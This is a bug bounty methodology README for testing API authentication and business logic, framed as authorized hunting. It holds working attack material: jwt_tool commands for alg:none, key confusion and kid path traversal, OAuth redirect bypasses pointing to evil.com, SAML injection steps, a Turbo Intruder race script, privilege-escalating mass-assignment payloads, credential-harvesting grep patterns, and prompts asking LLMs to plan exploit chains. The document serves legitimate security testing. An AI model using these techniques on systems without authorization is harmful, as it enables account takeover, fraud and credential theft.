# ⬟ APEX RECON FRAMEWORK 

## "The Architecture of Inevitability"

### Optimized for: API Authentication & Business Logic Vulnerabilities | AI Integration Level: Maximum

---

# PHASE 0: PRE-ENGAGEMENT COGNITIVE SETUP

## Hunter Mindset Check

Before touching a single tool, ask yourself: _"Do I understand what this application is supposed to do — and where a developer under deadline pressure would have cut corners?"_ If the answer is no, you are not ready to start.

## Mental Model Initialization

You are not a scanner. You are a business analyst with malicious intent. The bugs you are hunting live in the gap between what a developer _assumed_ would happen and what _can_ happen. Your primary weapon before any tool runs is a cognitive model of the target's business logic.

Adopt these six mental models simultaneously:

**1. "Functionality Over Subdomains"** — `api2.target.com` is worthless unless you know it's the v2 GraphQL endpoint for the mobile app backend with relaxed auth. Understanding _what_ a surface does is worth more than having 10,000 subdomains.

**2. "New Code is Buggy Code"** — The highest-yield recon target in 2025–2026 is change detection. A new `/v3/admin` endpoint pushed last Tuesday is infinitely more valuable than a `/v1/login` endpoint tested by 500 people before you.

**3. "Think Like the Builder Under Pressure"** — Ask: _"If I shipped this feature in 72 hours, what would I have skipped?"_ The answer is always: server-side validation, re-authentication on state changes, and atomic transaction enforcement.

**4. "Desynchronization of Truth"** — In microservice architectures, the "truth" of a user's state lives in at least 4 places simultaneously: the JWT, the session cache, the database, and the frontend local storage. Your job is to find where these disagree.

**5. "Chain Low into Critical"** — A single misconfigured CORS header is informational. Combined with an open redirect pointing at a vulnerable OAuth callback, it becomes account takeover. Stop reporting in isolation. Build the story.

**6. "Depth Over Breadth"** — Every program already has automated scanners running. If a tool found it in 5 seconds, it's already been reported by 20 people. Your edge is going where tools cannot: business logic, race conditions, and trust assumption exploitation.

## LLM Threat Model — Run This Before Anything Else

Open Claude Sonnet 4.6 or GPT-5 and run this prompt with whatever public information you have about the target:

```text
You are a senior offensive security architect. I am about to begin a bug 
bounty engagement on [TARGET NAME/DESCRIPTION].

Based on what you know about this type of application:

1. Generate a comprehensive API attack surface hypothesis — list every 
   probable API gateway, auth server, OAuth provider, and microservice 
   boundary this company likely has.

2. Map their probable technology stack and identify known vulnerability 
   classes for that stack (e.g., Node.js = prototype pollution, 
   Java Spring = actuator exposure, Ruby = SAML parser differentials).

3. Identify the 5 most business-critical flows this application supports 
   (e.g., payment, role upgrade, account creation, invite flow, export).

4. For each flow, generate 3 "broken assumption" scenarios a developer 
   under deadline pressure might have introduced.

5. Flag which vulnerability classes from this list are highest probability 
   for this target type: JWT algorithm confusion, OAuth redirect bypass, 
   SAML parser differential, race condition on state transitions, IDOR 
   chains, mass assignment, multi-tenant boundary failure.

Output as structured JSON grouped by attack surface.
```

Save this output. It is your targeting intelligence document. Every recon decision you make from this point forward should be validated against it.

---

# PHASE 1: PASSIVE INTELLIGENCE COLLECTION

## Hunter Mindset Check

_"Am I collecting data or am I collecting intelligence?"_ Raw URLs are data. URLs clustered by function, annotated by auth requirement, and cross-referenced against your threat model — that is intelligence.

## Step 1.1 — Subdomain Enumeration (Merge Strategy)

Run all three tools simultaneously and merge:

```bash
subfinder -d target.com -silent -o subfinder.txt
assetfinder --subs-only target.com > assetfinder.txt
amass enum -passive -d target.com -o amass.txt

# Merge, deduplicate, resolve
cat subfinder.txt assetfinder.txt amass.txt | sort -u > all_subdomains.txt
```

**What you're hunting for API Auth:** `auth.`, `sso.`, `login.`, `oauth.`, `token.`, `api-v2.`, `identity.`, `idp.`, `sts.` — these are your authentication service subdomains. Flag every single one.

**What you're hunting for Business Logic:** `staging.`, `dev.`, `beta.`, `v2.`, `internal.`, `test.`, `sandbox.` — these environments frequently have relaxed validation, disabled logic checks, or debug parameters still active.

## Step 1.2 — Live Host Validation + Tech Fingerprinting

```bash
cat all_subdomains.txt | httpx -silent -title -tech-detect \
  -json -o httpx_out.json

# Pull live URLs only
cat httpx_out.json | jq -r '.url' > alive_hosts.txt

# Fingerprint and flag high-value tech
cat httpx_out.json | jq -r 'select(.technologies != null) | 
  "\(.url) \(.technologies[])"' | \
  grep -iE "(grafana|veeam|n8n|spring|strapi|keycloak|okta|auth0|kong|apigee|swagger|graphql)" | tee tech_fingerprints.txt
```

**AI Triage — run this immediately after httpx:**
```text
Summarize these httpx scan results. Group hosts into:
- Authentication surfaces (OAuth servers, SSO, identity providers)  
- API gateways and versioned API hosts
- Admin/internal panels
- Staging/dev environments
- High-value tech (Spring Boot, GraphQL, Strapi, etc.)

Flag anything with uncommon technologies or naming conventions that 
suggest debug/legacy/internal access.

[PASTE httpx_out.json or alive_hosts.txt here]
```

## Step 1.3 — Historical URL Collection

```bash
# Get all historical URLs
gau target.com | tee gau_urls.txt
waybackurls target.com | tee wayback_urls.txt

# Merge
cat gau_urls.txt wayback_urls.txt | sort -u > all_urls.txt

# Extract high-value targets
cat all_urls.txt | grep -E "\.(js|json|yaml|conf|env|config)" > interesting_files.txt
cat all_urls.txt | grep -iE "(api|auth|oauth|token|login|admin|v1|v2|v3)" > api_urls.txt
cat all_urls.txt | grep "?" > parameterized_urls.txt
```

**For API Auth:** The `interesting_files.txt` list is gold. Old `.env` files, `config.json` exposures, and YAML files with hardcoded secrets or token endpoints live here. For Business Logic: `api_urls.txt` often surfaces ghost endpoints — `/api/v1/admin/export`, `/api/beta/payment/refund` — that still respond but have never been retested after the v2 migration.

## Step 1.4 — LLM-Assisted Wordlist Generation (2025 Technique)

Before fuzzing, use an LLM to generate a target-specific subdomain and endpoint wordlist that goes beyond generic lists:
```text
Create a subdomain and API endpoint enumeration wordlist for [TARGET].

Context about their stack: [paste tech_fingerprints.txt output]
Context about their business: [brief description]

Generate:
1. 200 subdomain prefixes likely unique to this company based on their 
   stack and business (avoid generic wordlists)
2. 200 API route patterns based on their technology stack 
   (e.g., if Spring Boot: /actuator/*, /admin/*, etc.)
3. 50 API versioning patterns (/v1/, /v2/, /api/v1/, /rest/v2/, etc.)

Output as plain text, one entry per line, no duplicates.
```

Feed the output into puredns or ffuf for enhanced discovery coverage.

---

# PHASE 2: ACTIVE SURFACE MAPPING

## Hunter Mindset Check

_"Have I mapped what this application DOES before I start hitting endpoints?"_ Crawling without understanding the business flow is noise generation. Map the happy path first.

## Step 2.1 — Deep Crawling

```bash
# Katana for modern JS-heavy apps
katana -u https://target.com -d 5 -jc -kf all -o katana_out.txt

# Hakrawler for speed
echo "https://target.com" | hakrawler -depth 3 -plain | tee hakrawler_out.txt

# Gospider for comprehensive link extraction
gospider -s https://target.com -c 10 -d 3 --other-source \
  -o crawl_output/

# Merge all crawl output
cat katana_out.txt hakrawler_out.txt crawl_output/* | \
  sort -u > all_crawled.txt

# Segment by type
cat all_crawled.txt | grep "/api/" > api_paths.txt
cat all_crawled.txt | grep "\.js$" > js_files.txt
cat all_crawled.txt | grep "?" > dynamic_params.txt
```

## Step 2.2 — API Specification Harvesting

Before fuzzing blindly, check if the target has published their API schema:

```bash
# Discover Swagger/OpenAPI specs
ffuf -w assetnote-swagger-wordlist.txt \
  -u https://target.com/FUZZ \
  -mc 200 -o swagger_hits.json

# Common paths to check manually
/swagger.json
/openapi.json
/api-docs
/v2/api-docs
/api/swagger.json
/.well-known/openid-configuration    # OAuth/OIDC discovery document
/graphql                              # GraphQL endpoint
/.well-known/jwks.json               # JWT public keys — critical for alg confusion
```

**If you find `/.well-known/openid-configuration`:** Save everything. This document tells you every OAuth endpoint, supported scopes, token formats, and signing algorithms. It is your OAuth attack surface map.

**If you find `/.well-known/jwks.json`:** Download the public key. You will use it later for RS256→HS256 algorithm confusion attacks.

**LLM Swagger Analysis — run this on every spec you find:**
```text
You are a security researcher. I'm giving you this OpenAPI/Swagger spec 
for [target.com]. Analyze it and:

1. List ALL authentication endpoints (login, token refresh, OAuth 
   callbacks, logout, password reset, email verify, MFA endpoints)
2. Identify every endpoint that accepts user-controlled IDs in path, 
   query, or body — flag each as potential BOLA/IDOR
3. Identify endpoints requiring elevated privilege vs what is documented
4. Map business logic flows (payment, subscription, role management, 
   invite, export, approval workflows)
5. List parameters that could be candidates for mass assignment 
   (role, isAdmin, verified, subscription_tier, plan)
6. Flag any version discrepancies — endpoints in v1 that don't exist in v2
7. Identify any deprecated or "internal" endpoints still in spec

Output as JSON grouped by: Auth Endpoints | IDOR Candidates | 
Business Logic Flows | Mass Assignment Candidates | Legacy/Deprecated

[PASTE FULL SPEC]
```

## Step 2.3 — GraphQL Introspection

If GraphQL is detected:

```bash
# Full introspection query
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name args { name type { name } } } } } }"}'

# Use GraphQL Voyager for visualization (paste schema into voyager.js)
# Use InQL Burp extension for automated analysis
```

**What to look for for Auth:** Mutations that accept user IDs without authorization checks, password reset mutations, role assignment mutations, token generation queries. **For Business Logic:** Look for mutations performing financial operations (transfer, refund, discount), approval/state-change mutations, and any mutation that takes an `owner_id` or `user_id` parameter.

## Step 2.4 — JavaScript Analysis (AI-Augmented)

JavaScript analysis is where the biggest differential exists between elite and average hunters. Average hunters skip it. Elite hunters treat every JS file as a potential goldmine.

```bash
# Extract all JS URLs
cat all_urls.txt | grep "\.js$" | sort -u > final_js.txt

# Extract secrets with SecretFinder
cat final_js.txt | while read url; do
  python3 SecretFinder.py -i "$url" -o cli >> secrets_raw.txt
done

# Run gf patterns for signals
cat all_urls.txt | gf aws-keys | tee gf_aws.txt
cat all_urls.txt | gf jwt | tee gf_jwt.txt
cat all_urls.txt | gf idor | tee gf_idor.txt

# Source map extraction (exposes original unminified code)
# Look for .js.map files
cat all_urls.txt | grep "\.js\.map" | while read url; do
  sourcemapper -url "$url" -output sourcemaps/
done
```

**LLM JS Analysis — for each high-value JS file:**
```text
Analyze this JavaScript file and extract:

1. All fetch(), axios(), XMLHttpRequest() calls — list every API 
   endpoint URL found
2. Any hardcoded tokens, API keys, secrets, or environment variable 
   references
3. Authentication logic — how does the app build/validate tokens? 
   What claims does it check client-side?
4. Any business logic visible in the code — pricing calculations, 
   role checks, feature flags, discount logic
5. Hidden endpoints not in the Swagger spec
6. Any parameters that appear to control authorization (role, plan, 
   isAdmin, tier, subscription)

Output as: Endpoints | Secrets | Auth Logic | Business Logic | 
Hidden Params

[PASTE JS CONTENT]
```

## Step 2.5 — API Endpoint Fuzzing

```bash
# Use Assetnote's API-specific wordlist (best available in 2025)
ffuf -w httparchive_apiroutes_2024_11_28.txt \
  -u https://target.com/FUZZ \
  -mc 200,201,204,301,302,401,403 \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -o api_fuzz_auth.json

# Test without auth to find unauthenticated endpoints
ffuf -w httparchive_apiroutes_2024_11_28.txt \
  -u https://target.com/FUZZ \
  -mc 200,201,204 \
  -o api_fuzz_noauth.json

# Kiterunner for context-aware API scanning
kr scan https://target.com -w routes-large.kite \
  -H "Authorization: Bearer YOUR_TOKEN" \
  --output-file kiterunner_results.txt

# Hidden parameter discovery on interesting endpoints
arjun -u https://target.com/api/v1/user/profile \
  -m GET --stable -oJ arjun_params.json
```

**What Kiterunner uniquely surfaces:** Context-aware API routes that ffuf misses because it understands API conventions (REST patterns, versioning, HTTP method expectations). It finds `/v1/admin/internal/debug` type endpoints that generic wordlists skip.

---

# PHASE 3: DEEP API AUTH ANALYSIS

## Hunter Mindset Check

_"Have I mapped the authentication mechanism COMPLETELY before I probe it? Do I know where the token comes from, how it's validated, and what it controls?"_ If you probe auth without this map, you are guessing.

## Step 3.1 — Authentication Mechanism Classification

First, classify what you're dealing with by answering:

- Is auth JWT-based? → Go to 3.2
- Is auth OAuth 2.0/OIDC? → Go to 3.3
- Is auth SAML/SSO? → Go to 3.4
- Is auth API Key? → Go to 3.5
- Is auth multi-tenant? → Go to 3.6
- Is auth session-based with cookies? → Run Autorize for BOLA, test session invalidation

## Step 3.2 — JWT Attack Workflow

```bash
# Step 1: Capture a valid JWT (intercept via Burp)
# Step 2: Decode and examine (jwt.io or jwt_tool)
python3 jwt_tool.py <JWT> -T   # Tamper mode — shows all claims

# Step 3: Run all known attacks in sequence
# Test 1: alg:none attack
python3 jwt_tool.py <JWT> -X a

# Test 2: Algorithm confusion RS256 → HS256
# (requires public key from /.well-known/jwks.json)
python3 jwt_tool.py <JWT> -X k -pk public_key.pem

# Test 3: Weak secret brute force
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

# Test 4: kid header injection (SQL/path traversal)
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null"

# Test 5: jku/x5u header injection (point to attacker-controlled JWKS)
python3 jwt_tool.py <JWT> -X s

# Test 6: Full scan — all known attacks
python3 jwt_tool.py <JWT> -M pb
```

**Manual claim manipulation (always test):**

In Burp JWT Editor extension, manually modify:
- `"role": "user"` → `"role": "admin"`
- `"sub": "123"` → `"sub": "1"` (target admin account)
- `"tenant_id": "abc"` → `"tenant_id": "xyz"` (cross-tenant)
- `"exp": 1700000000` → `"exp": 9999999999` (expire bypass)
- `"scope": "read"` → `"scope": "read write admin"` (scope escalation)
- `"aud": "app1"` → `"aud": "app2"` (audience confusion)

**LLM Pattern Recognition — feed request/response pairs:**
```text
I am testing JWT-based authentication on this API. Here are 
10 request/response pairs showing different auth scenarios:

[PASTE REQUEST/RESPONSE PAIRS]

Analyze these and identify:
1. Does the server validate the `aud` claim?
2. Does the server check token expiration strictly?
3. Are there any claims being used for authorization decisions 
   that could be manipulated?
4. Does the server behavior change between endpoints in a way 
   that suggests inconsistent validation?
5. Any anomalies in error messages that reveal implementation details?
```

## Step 3.3 — OAuth 2.0 / OIDC Attack Workflow

**Step 1: Map the entire OAuth flow** — intercept every request from "Login with [Provider]" click through to token receipt. Document every parameter.

**Step 2: Systematic parameter testing:**
```text
OAuth Checklist — test each item:

□ state parameter: Is it validated? Can you reuse it?
□ redirect_uri: 
   - Test regex bypass: https://legitimate.com.evil.com
   - Test path traversal: https://legitimate.com/../evil
   - Test URL fragment: https://legitimate.com#@evil.com
   - Test parameter pollution: redirect_uri=legit&redirect_uri=evil
□ scope: Can you add undocumented scopes? (admin, internal, write)
□ response_type: Test response_type=token when code expected
□ PKCE: Is it enforced? Can you send without code_challenge?
□ Authorization code: Can it be used twice?
□ Token endpoint: Test client_secret bypass
□ /.well-known/openid-configuration: Are all endpoints tested?
□ request_uri parameter: Server may validate query string but not 
  JWT-encoded params — test redirect_uri inside signed JWT
□ Email verification bypass: Create OAuth account with victim's email,
  authenticate before victim verifies
```

**LLM OAuth Analysis:**
```text
Here is the complete OAuth flow I captured for [target]:

[PASTE ALL INTERCEPTED REQUESTS IN ORDER]

You are a security researcher specializing in OAuth misconfigurations.
Analyze this flow and identify:
1. Any missing validations (state, PKCE, redirect_uri binding)
2. Timing vulnerabilities between authorization code issuance and use
3. Token scope over-permissions
4. Any parameters that could be manipulated at each step
5. Account linking abuse potential
6. Hidden endpoints in the OIDC discovery document not tested
```

## Step 3.4 — SAML/SSO Parser Differential Testing

This is the highest-novelty auth attack class of 2025. Ruby-SAML, PHP-SAML, and samlify (Node.js) all have documented parser differential bypasses.
```text
SAML Attack Sequence:

1. Fingerprint the SAML library (check HTTP headers, error messages, 
   response format, timing)

2. Test signature wrapping attacks:
   - Valid signature on outer element, malicious inner element
   - Move signature to cover only non-sensitive elements

3. Test comment injection:
   - admin<!--comment-->@target.com as NameID
   - Some parsers strip comments before processing, 
     others don't — creates identity ambiguity

4. Test duplicate NameID elements:
   - Send SAML response with two NameID elements
   - Different parsers pick different ones

5. Test namespace confusion:
   - Add unexpected XML namespaces to assertion elements

6. Test assertion replay (no timestamp validation?)

Tools: SAML Raider (Burp extension), manual XML crafting
```

## Step 3.5 — API Key Analysis

```bash
# After SecretFinder / gf aws-keys runs:
# Entropy analysis on all found potential keys
cat secrets_raw.txt | python3 entropy_checker.py

# Test every found key against the API
# Look for keys in: JS files, GitHub repos, old URLs, 
# error messages, HTTP response headers

# GitHub secret mining
gh api "search/code?q=org:TARGET+api_key+OR+secret+OR+password" | \
  jq '.items[].html_url'

# Also check: X-API-Key, Authorization headers in old cached responses
# from gau/waybackurls — sometimes tokens are in URL parameters
cat all_urls.txt | grep -iE "(token=|api_key=|apikey=|access_token=|secret=|password=)" > leaked_creds_in_urls.txt
```

## Step 3.6 — Multi-Tenant Boundary Testing

This is the highest-yield auth bug class for SaaS applications in 2025–2026.
```text
Multi-Tenant Test Protocol:

Setup: Create Tenant A account and Tenant B account (separate emails)

Test 1: Token cross-use
- Get auth token for Tenant A
- Use it on Tenant B endpoints
- Test: /api/org/[TENANT_B_ID]/users, /api/org/[TENANT_B_ID]/settings

Test 2: JWT tenant claim manipulation  
- Modify tenant_id / org_id / workspace_id claim in JWT
- Test with Burp JWT Editor

Test 3: Context switching without re-auth
- Switch tenant context in UI
- Check if session remains valid with old tenant's permissions

Test 4: Identity federation abuse (Okta/Auth0 targets)
- Test Account Auto-Link: create account via SSO with victim's email
- Check if it links to existing account without verification

Test 5: Row-level security bypass
- Test CVE-2024-10976 PostgreSQL RLS pattern
- Inject tenant context via SQL-injectable parameters

LLM Analysis Prompt:
"I am testing a multi-tenant SaaS application. Here are the API 
requests I made as Tenant A that also returned data or succeeded 
when I substituted Tenant B's identifiers: [PASTE REQUESTS]. 
Analyze the blast radius of each finding and suggest chained 
exploitation paths."
```

---

# PHASE 4: BUSINESS LOGIC SURFACE ANALYSIS

## Hunter Mindset Check
*"Have I mapped WHAT the application is supposed to do before I try to break it? Can I describe the complete happy path for each critical business flow?"* A hunter who cannot describe the expected behavior cannot identify the unexpected behavior.

## Step 4.1 — Business Flow Reconstruction

For every critical business flow (payment, subscription upgrade, invite, approval, refund, export):

**Manually walk the complete flow** in Burp's proxy. For each step, record:
- Endpoint + HTTP method
- All parameters sent (including hidden fields)
- What the server validates (test by removing each parameter)
- What the server trusts from the client (this is where bugs live)
- Any state changes that occur on the backend

**LLM Flow Analysis:**
```text
Here is the complete HTTP request/response sequence for [TARGET]'s 
checkout/payment flow:

[PASTE FULL BURP PROXY HISTORY FOR THE FLOW]

Act as an offensive security researcher specializing in business logic.
Analyze this flow and identify:
1. All implicit developer assumptions (e.g., "steps must be completed 
   in order", "price cannot change after cart creation", "user_id 
   must match session")
2. Every point where client-supplied data influences a business 
   decision (price, quantity, role, discount, recipient)
3. Race condition windows — steps that involve reading then writing 
   state that should be atomic
4. Workflow bypass candidates — can step 3 be called without step 2?
5. Cross-step authorization — does step 4 re-verify permissions 
   established in step 1?

Rank each finding by exploitability and financial impact.
```

## Step 4.2 — State Machine Mapping

Draw (or describe to an LLM) the application's state machine for each critical flow. Then systematically attack the transitions:
```text
State Machine Attack Checklist:

□ Forward skip: Call step N+2 without completing step N
□ Backward replay: Re-execute a completed step (coupon re-application)
□ Parallel execution: Race condition on single-use transitions
□ State corruption: Interrupt a multi-step flow mid-way
□ Cross-flow state injection: Use state from Flow A to bypass Flow B
□ Session-state desync: Log out/log in between steps, does state persist?
□ Partial state exploitation:
   Sign up → Change email (verification pending) → Access premium feature
   (Does "pending verification" state grant any unintended access?)
```

## Step 4.3 — Race Condition Candidate Identification

Identify candidates by asking: _"Is this an action that should only succeed once? Does it involve reading a value then writing it back?"_

**High-value candidates:**

- Coupon/promo code redemption
- Gift card balance consumption
- Referral bonus credit
- Free trial activation
- Password reset token consumption
- Email verification token use
- Withdrawal / fund transfer
- Approval workflows (approve/reject)
- Account tier upgrades via payment

**Execution — HTTP/2 Single-Packet Attack:**

```python
# Burp Turbo Intruder — single-packet attack template
# Engine: BURP2 for HTTP/2

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)
    # Send 20 requests simultaneously in one TCP packet
    for i in range(20):
        engine.queue(target.req, str(i))

def handleResponse(req, interesting):
    if '200' in req.response or 'success' in req.response:
        table.add(req)
```

**After running:** Count how many "success" responses you received. More than 1 on a single-use action = confirmed race condition.

## Step 4.4 — Price & Value Manipulation Matrix

Test every parameter involved in financial calculations:
```text
Parameter Manipulation Test Matrix:

For each: price, quantity, amount, discount, credit, balance, fee

Test 1: Negative values
  {"quantity": -1, "price": 100} → do you get credited?

Test 2: Zero
  {"amount": 0} → does payment succeed?

Test 3: Integer overflow
  {"quantity": 99999999999} → does price calculation overflow to negative?

Test 4: Decimal manipulation
  {"price": 0.001} → does system round down to 0?

Test 5: Scientific notation
  {"amount": 1e-10} → does parser accept but system round to 0?

Test 6: Currency confusion
  {"currency": "JPY", "amount": 100} → billed as $100 JPY = $0.67 USD?

Test 7: Parameter pollution
  price=100&price=1 → which does backend use?

Test 8: Product ID swap
  Change product_id to cheaper item at checkout confirmation step

Real finding reference: Negative last_payable_amount=-999 on 
e-commerce target → amount reflected as positive credit to 
attacker's wallet ($50K bounty)
```

## Step 4.5 — Mass Assignment & Hidden Parameter Injection

```bash
# Discover hidden parameters with Arjun
arjun -u https://target.com/api/v1/user/update \
  -m POST --stable -oJ params.json

# Also test with Param Miner (Burp extension)
# Right-click request → Extensions → Param Miner → Guess params

# Manual mass assignment attempts on every POST/PUT/PATCH
# Always try injecting:
{
  "role": "admin",
  "isAdmin": true,
  "is_verified": true,
  "subscription": "enterprise",
  "plan": "premium",
  "credits": 99999,
  "verified": true,
  "email_verified": true,
  "2fa_enabled": false
}
```

---

# PHASE 5: AI-AUGMENTED TRIAGE & PRIORITIZATION

## Hunter Mindset Check
*"Before I start manually testing everything, have I used AI to identify my top 3 highest-probability, highest-impact targets?"* Automation surfaces candidates. AI prioritizes them. Humans exploit them.

## Step 5.1 — Recon Output Triage

After phases 1–4, you have a large dataset. Feed it to an LLM for intelligent prioritization:
```text
I have completed reconnaissance on [TARGET]. Here is my combined 
recon output:

Subdomains found: [paste alive_hosts.txt]
API endpoints discovered: [paste api_paths.txt + kiterunner output]
Technologies fingerprinted: [paste tech_fingerprints.txt]
JWT tokens found: [paste gf_jwt.txt]
IDOR candidates: [paste gf_idor.txt]
Secrets found: [paste secrets_raw.txt summary]
Interesting parameters: [paste arjun output]

My target vulnerability classes are: API Authentication bypass 
and Business Logic flaws.

Rank my top 10 highest-priority testing targets by:
1. Probability of critical/P1 finding
2. Estimated time to confirm
3. Which specific attack technique to try first
4. Why this target is high-priority

Output as a numbered priority list with reasoning.
```

## Step 5.2 — Multi-Model Pipeline for Hypothesis Generation

Use a two-model pipeline for vulnerability hypothesis:

**Model 1 (Parsing/Classification — use Haiku or GPT-4o mini):**
```text
Classify each of these HTTP endpoints by: auth requirement, 
HTTP method, data type handled, business sensitivity.
Output as JSON array.
[PASTE ENDPOINT LIST]
```

**Model 2 (Hypothesis Generation — use Claude Sonnet 4.6 or GPT-5):**
```text
Given this classified endpoint inventory for [TARGET]:
[PASTE MODEL 1 OUTPUT]

Generate exploitation hypotheses for the top 5 highest-risk 
endpoints. For each, provide:
- Specific attack technique (be precise, not generic)
- Exact HTTP request structure to test
- Expected vulnerable vs expected secure response
- Confidence score (1-10) with reasoning
```

## Step 5.3 — Nuclei Automated Triage

Run Nuclei across your alive hosts for fast, wide triage. Do not treat Nuclei results as confirmed vulnerabilities — treat them as AI-scored leads for manual investigation:

```bash
# Full template scan on alive hosts
cat alive_hosts.txt | nuclei -t ~/nuclei-templates/ \
  -severity critical,high,medium \
  -o nuclei_results.txt

# 2025/2026 CVE-specific scan
cat alive_hosts.txt | nuclei -t ~/nuclei-templates/http/cves/2025/ \
  -t ~/nuclei-templates/http/cves/2026/ \
  -o nuclei_cve_results.txt
```

**LLM Nuclei Template Generation:**
```text
Write a valid Nuclei YAML template that tests for JWT algorithm 
confusion (RS256 to HS256) on this endpoint:
POST /api/v1/auth/refresh
The server uses: Authorization: Bearer <JWT>

Include:
- Proper matchers for vulnerable vs secure response
- The modified JWT in the request
- A clear name and description

Output only valid YAML.
```

---

# PHASE 6: TARGETED EXPLOITATION RECON

## Hunter Mindset Check
*"For my top 3 targets, can I describe EXACTLY what the exploitation chain looks like? Can I articulate the impact in one sentence for the triage team?"* If you cannot, you need more recon — not more exploitation attempts.

## Step 6.1 — Deep-Dive Targeting

For each priority target from Phase 5, run a focused deep-dive:

**For JWT targets:** Capture 5+ tokens from different user roles, different time periods, different endpoints. Map every claim. Feed all of them to jwt_tool `-M pb`. Cross-reference with the JWKS endpoint.

**For OAuth targets:** Walk the complete flow 3 times with different parameters. Map every redirect. Test every parameter with OWASP's OAuth testing guide as a checklist.

**For Race Condition targets:** Map the exact race window. Time the endpoint's response. Calculate optimal concurrency. Use first-sequence-sync technique for endpoints with longer processing windows.

**For Business Logic targets:** Map the complete state machine. Identify every developer assumption. Test each assumption independently before chaining.

## Step 6.2 — Chain Building

The highest-value findings in 2025–2026 are chains. Use this LLM prompt to identify chains:
```text
I have found the following individual security issues on [TARGET]:

Issue 1: [describe]
Issue 2: [describe]  
Issue 3: [describe]

As an offensive security researcher, analyze how these issues 
could be chained to achieve maximum impact. Consider:
- Can Issue 1's output be used as input for Issue 2?
- Can the combination achieve account takeover, data exfiltration, 
  or financial fraud that neither issue achieves alone?
- What is the minimum number of steps required for the chain?
- What evidence would I need to demonstrate the full chain impact?

Draw the attack chain as a sequence of numbered steps.
```

---

# ANTI-PATTERNS TO AVOID

These are consensus failure modes across elite hunters — avoid them completely:

**1. Over-automation without analysis** — Running every tool in your arsenal and submitting Nuclei output as findings. Triage teams reject these. Every automated finding needs manual confirmation and impact demonstration.

**2. Ignoring JavaScript files** — JS files are the most underanalyzed surface in modern web apps. They contain API endpoints, auth logic, business rules, and secrets that no scanner will find. Read them with LLM assistance on every engagement.

**3. Testing auth endpoints in isolation** — A JWT misconfiguration that only allows role tampering within the same tenant is a medium. The same misconfiguration that allows cross-tenant access is a critical. Always test auth bugs against their business logic blast radius.

**4. Missing v1 endpoints** — Companies migrate to v2 but rarely turn off v1. The old endpoint exists, is no longer maintained, and has weaker auth. Always check for version discrepancies between what's documented and what's alive.

**5. Ignoring `.well-known` endpoints** — `/.well-known/openid-configuration` is the OAuth attacker's dream document. It tells you every endpoint, scope, and algorithm. Fetch it before anything else on an OAuth target.

**6. Testing race conditions over HTTP/1.1** — In 2025, there is no excuse. Always use HTTP/2 single-packet attack via Burp Turbo Intruder. HTTP/1.1 last-byte sync has too much jitter for reliable results.

**7. Reporting low-severity findings in isolation** — A CORS misconfiguration is 100 points. An open redirect is 100 points. CORS + open redirect + sensitive endpoint = P1 account takeover. Build the chain before you report.

**8. Skipping workflow steps in isolation without understanding state** — Calling `/api/v1/checkout/confirm` without completing prior steps is basic. Calling it with a manipulated `amount` parameter _and_ a race condition on the payment confirmation is a critical finding. Combine techniques.

**9. Not checking historical URLs** — Ghost endpoints from gau/waybackurls are invisible to live scanners but still respond. One S3 bucket exposed via a 3-year-old URL = $50,000 finding. Always harvest historical data.

**10. Trusting client-side validation** — If the frontend validates that a price is positive, the backend often doesn't. Test every restriction you see on the frontend by bypassing it entirely in Burp. Developer shortcuts happen server-side when they trust frontend validation.

---

# THE META-STRATEGY

## How Elite Hunters Think Differently

The gap between average and elite hunters on API/Business Logic targets is not tooling — it is **cognitive architecture**. Elite hunters ask fundamentally different questions.

An average hunter asks: _"Is this endpoint vulnerable?"_ An elite hunter asks: _"What did the developer believe about this endpoint that I can prove is wrong?"_

This distinction is the entire game. Every critical API auth finding is a broken assumption: the developer assumed the algorithm claim in the JWT header would never be changed. Every critical business logic finding is a broken assumption: the developer assumed users would never submit a negative quantity.

Your primary job during recon is to **build a list of developer assumptions**, then systematically falsify each one.

## How AI Changes the Game — and What It Doesn't

**AI dominates:** Pattern recognition at scale (parsing 10,000 endpoints for IDOR patterns), knowledge synthesis (mapping a JWT library to its known CVEs), hypothesis generation (suggesting what a race condition window might look like), and triage (prioritizing 500 recon leads into a top-10 list).

**Humans still dominate:** Identifying trust assumptions that no training data contains, understanding business context ("why would you ever need to transfer funds to yourself?"), and chaining findings that individually seem unrelated. The $50K–$100K findings are still found by human intuition operating on AI-processed intelligence.

The winning formula: **AI processes, humans decide, AI accelerates execution.**

## The Compounding Recon Loop

Recon does not end when exploitation begins. Every finding reshapes your recon. When you find a JWT misconfiguration, immediately ask: what other endpoints use this same auth pattern? When you find a race condition on coupon redemption, immediately ask: what other single-use state transitions exist in this application? When you find a mass assignment parameter on `/profile/update`, immediately ask: which other PUT/PATCH endpoints accept similar parameters?

Your initial recon map is a hypothesis. Every finding is evidence that updates the hypothesis. The hunters winning in 2026 treat recon as a continuous feedback loop, not a one-time phase.

The architecture of inevitability is this: if you map the complete surface, enumerate every assumption, apply AI-augmented analysis at every leverage point, and compound each finding back into new recon — a critical finding is not lucky. It is the logical outcome of a complete methodology.

---

# BUILD INSTRUCTIONS

The APEX RECON FRAMEWORK is fundamentally a methodology and documentation repository. As such, there is no source code to compile or binaries to build.

To "build" or utilize this framework:

1. **Read and Internalize**: Open `README.md` in any standard Markdown viewer (e.g., GitHub, VS Code, Obsidian) or text editor.
2. **Tool Installation**: The framework relies on several external security tools. Ensure you have the following installed and in your `$PATH`:
   - `subfinder`, `assetfinder`, `amass`
   - `httpx`
   - `gau`, `waybackurls`
   - `katana`, `hakrawler`, `gospider`
   - `ffuf`, `kr` (kiterunner)
   - `arjun`
   - `nuclei`
   - `python3` (for scripts like `jwt_tool.py`, `SecretFinder.py`)
   - `jq`, `gf`
3. **Execution**: Follow the phases outlined in this document chronologically during your engagement.
